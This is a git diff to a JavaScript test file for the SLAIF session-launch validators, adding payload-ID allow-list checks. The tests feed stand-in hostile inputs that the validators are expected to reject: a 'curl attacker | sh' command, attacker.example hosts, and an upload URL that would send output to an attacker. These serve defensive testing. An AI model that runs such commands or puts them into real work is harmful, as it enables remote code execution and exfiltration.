@@ -6,11 +6,13 @@ import {
   validateLaunchMessage,
   validateSessionDescriptor,
 } from '../extension/js/slaif_session_descriptor.js';
+import {buildDefaultPayloadCatalog} from '../server/workloads/payload_catalog.js';
 
 const pending = {
   type: 'slaif.startSession',
   version: 1,
   hpc: 'test-sshd',
+  payloadId: 'gpu_diagnostics_v1',
   sessionId: 'sess_descriptor123',
   launchToken: 'launch-token-123456',
 };
@@ -19,6 +21,7 @@ const policyHost = {
   hostKeyAlias: 'test-sshd',
   sshHost: '127.0.0.1',
   sshPort: 22,
+  allowedPayloadIds: ['gpu_diagnostics_v1'],
 };
 const signedPolicy = {
   type: 'slaif.hpcPolicy',
@@ -29,6 +32,7 @@ const signedPolicy = {
   validUntil: '2027-12-31T23:59:59.000Z',
   allowedApiOrigins: ['https://connect.slaif.si'],
   allowedRelayOrigins: ['wss://connect.slaif.si'],
+  allowedPayloads: buildDefaultPayloadCatalog(),
   hosts: {'test-sshd': policyHost},
 };
 
@@ -38,6 +42,7 @@ function descriptor(overrides = {}) {
     version: 1,
     sessionId: pending.sessionId,
     hpc: pending.hpc,
+    payloadId: pending.payloadId,
     relayUrl: 'wss://connect.slaif.si/ssh-relay',
     relayToken: 'relay-token-123456',
     relayTokenExpiresAt: new Date(Date.now() + 60000).toISOString(),
@@ -50,12 +55,15 @@ function descriptor(overrides = {}) {
 }
 
 assert.deepEqual(validateLaunchMessage(pending), pending);
+assert.throws(() => validateLaunchMessage({...pending, payloadId: undefined}), /payloadId/);
+assert.throws(() => validateLaunchMessage({...pending, payloadId: 'curl_attacker'}), /payloadId/);
 assert.throws(() => validateLaunchMessage({...pending, launchToken: undefined}), /launchToken/);
 assert.throws(() => validateLaunchMessage({...pending, hpc: 'bad host'}), /invalid HPC alias/);
 assert.throws(() => validateLaunchMessage({...pending, sessionId: 'sess_bad value'}), /invalid SLAIF session id/);
 assert.throws(() => validateLaunchMessage({...pending, sshHost: 'attacker.example'}), /sshHost/);
 assert.throws(() => validateLaunchMessage({...pending, sshPort: 22}), /sshPort/);
 assert.throws(() => validateLaunchMessage({...pending, command: 'curl attacker | sh'}), /command/);
+assert.throws(() => validateLaunchMessage({...pending, scriptText: '#!/bin/sh'}), /scriptText/);
 
 assert.equal(
     validateSessionDescriptor(descriptor(), pending, policyHost).relayUrl,
@@ -70,6 +78,16 @@ assert.throws(() => validateSessionDescriptor(
 assert.throws(() => validateSessionDescriptor(
     descriptor({hpc: 'vegahpc'}), pending, policyHost), /hpc mismatch/);
 assert.throws(() => validateSessionDescriptor(
+    descriptor({payloadId: 'cpu_memory_diagnostics_v1'}), pending, policyHost), /payloadId mismatch/);
+assert.throws(() => validateSessionDescriptor(
+    descriptor({payloadId: 'gams_chat_v1'}), pending, policyHost, {policy: signedPolicy}), /payloadId mismatch|not allowed/);
+assert.throws(() => validateSessionDescriptor(
+    descriptor({payloadId: 'gams_chat_v1'}),
+    {...pending, payloadId: 'gams_chat_v1'},
+    policyHost,
+    {policy: signedPolicy},
+), /not allowed/);
+assert.throws(() => validateSessionDescriptor(
     descriptor({sessionId: 'sess_other123'}), pending, policyHost), /sessionId mismatch/);
 assert.throws(() => validateSessionDescriptor(
     descriptor({sshHost: 'attacker.example'}), pending, policyHost), /sshHost/);
@@ -79,6 +97,8 @@ assert.throws(() => validateSessionDescriptor(
     descriptor({remoteCommand: 'evil'}), pending, policyHost), /remoteCommand/);
 assert.throws(() => validateSessionDescriptor(
     descriptor({jobCommand: 'evil'}), pending, policyHost), /jobCommand/);
+assert.throws(() => validateSessionDescriptor(
+    descriptor({scriptText: '#!/bin/sh'}), pending, policyHost), /scriptText/);
 assert.throws(() => validateSessionDescriptor(
     descriptor({stdoutUploadUrl: 'https://attacker.example/upload'}), pending, policyHost), /stdoutUploadUrl/);
 assert.throws(() => validateSessionDescriptor(
